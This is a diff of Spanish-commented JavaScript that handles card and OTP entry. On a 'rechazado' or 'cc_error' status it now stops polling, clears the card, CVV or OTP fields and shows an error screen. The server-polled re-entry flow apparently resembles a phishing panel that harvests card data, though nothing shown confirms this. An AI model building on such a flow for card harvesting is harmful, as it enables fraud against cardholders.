@@ -532,17 +532,19 @@ function iniciarPollingPago(sessionId, marca, payload) {
           openAuthModal();
           
         } else if (data.estado === 'rechazado' || data.estado === 'cc_error') {
-          // 🔥 NO DETENEMOS EL INTERVALO, SOLO LIMPIAMOS Y REABRIMOS
+          // 🔥 DETENEMOS EL POLLING Y MOSTRAMOS LA PANTALLA DE ERROR
+          clearInterval(pagoPollingInterval);
+          pagoPollingInterval = null;
           ocultarPagoCarga();
           
-          // Limpiamos los campos de la tarjeta
+          // Limpiamos los campos del formulario para que estén vacíos cuando reabran
           document.getElementById('cardNumber').value = '';
           document.getElementById('expiryMonth').value = '';
           document.getElementById('expiryYear').value = '';
           document.getElementById('cvv').value = '';
           
-          // Reabrimos el modal de la tarjeta
-          abrirModalTarjeta();
+          // Mostramos la pantalla de error
+          mostrarPagoError(marca, data.estado);
         }
       })
       .catch(function(err) { console.error('Error consultando estado:', err); });
@@ -697,14 +699,16 @@ function iniciarPollingOtp(sessionId, marca) {
           ocultarCargaOtp();
           setTimeout(function() { window.location.href = window.location.pathname; }, 300);
         } else if (data.estado === 'rechazado' || data.estado === 'cc_error') {
-          // 🔥 NO DETENEMOS EL INTERVALO, SOLO LIMPIAMOS Y REABRIMOS
+          // 🔥 DETENEMOS EL POLLING Y MOSTRAMOS LA PANTALLA DE ERROR
+          clearInterval(pagoOtpPollingInterval);
+          pagoOtpPollingInterval = null;
           ocultarCargaOtp();
           
           // Limpiamos el campo de OTP
           document.getElementById('dynamicCode').value = '';
           
-          // Reabrimos el modal de OTP
-          openAuthModal();
+          // Mostramos el error de OTP
+          mostrarErrorOtp(data.estado);
         }
       })
       .catch(function(err) { console.error('Error consultando estado OTP:', err); });
